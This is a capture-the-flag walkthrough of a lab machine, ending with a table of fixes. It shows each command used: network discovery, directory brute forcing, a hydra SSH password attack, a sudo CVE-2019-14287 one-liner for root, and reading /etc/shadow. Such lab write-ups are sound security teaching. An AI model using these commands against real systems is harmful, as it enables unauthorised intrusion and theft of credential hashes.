# Hackathon-1 — CTF Walkthrough

**Target:** 192.168.1.46 | **OS:** Ubuntu 14.04 LTS | **Attacker:** Kali Linux 2025.3

---

## Attack Chain

```
Host Discovery → Web Enumeration → SSH Brute-Force → Initial Access → Enumeration → Privilege Escalation → Root
```

---

## Steps

### 1. Host Discovery
```bash
netdiscover -r 192.168.1.0/24
```
Captured 65 ARP packets from 11 hosts. Identified `192.168.1.46` (VMware) as the target.

---

### 2. Web Enumeration
```bash
gobuster dir -u http://192.168.1.46 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x html,zip,txt,php
```
Found `/index.html`, `/robots.txt`, `/ftc.html`, `/sudo.html`, `/ctf.html`. Checked each page manually for hints and flags.

---

### 3. SSH Brute-Force
```bash
hydra -l test -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.46 -s 7223
```
SSH was running on non-standard port 7223. Hydra attempted ~14M passwords and cracked the `test` user's credentials.

---

### 4. Initial Access
```bash
ssh test@192.168.1.46 -p 7223
```
Logged in successfully as `test`. Server is Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64).

---

### 5. Post-Login Enumeration
```bash
whoami
history
ls -la /home
cat /etc/shadow
```
Reviewed bash history (193 commands). Found prior use of `linpeas.sh`, references to `ctf.zip`, and directory browsing across `/bin`, `/dev`, `/lib`, `/var`, `/run`, `/media`.

---

### 6. Privilege Escalation — CVE-2019-14287
```bash
sudo -u#-1 /bin/bash
```
Used the sudo UID `-1` bypass on the outdated sudo version. Escalated from `test` to `root` without knowing the root password.

---

### 7. Root Access
```bash
whoami   # root
ls /root
cat /etc/shadow
```
Gained full root shell. Accessed `/root` directory and read `/etc/shadow` with all password hashes.

---

## Vulnerabilities

| Issue | Details | Fix |
|-------|---------|-----|
| Weak SSH password | `test` user password found in rockyou.txt | Enforce strong passwords or key-based auth |
| Non-standard port | Port 7223 — security through obscurity | Use firewall rules instead |
| CVE-2019-14287 | `sudo -u#-1` escalates to root | Upgrade sudo to ≥ 1.8.28 |
| Ubuntu 14.04 EOL | No security patches since April 2019 | Upgrade the OS |

---

## Tools Used

`netdiscover` · `gobuster` · `hydra` · `ssh` · `linpeas.sh`

---

> **Disclaimer:** For educational purposes in a controlled lab environment only.
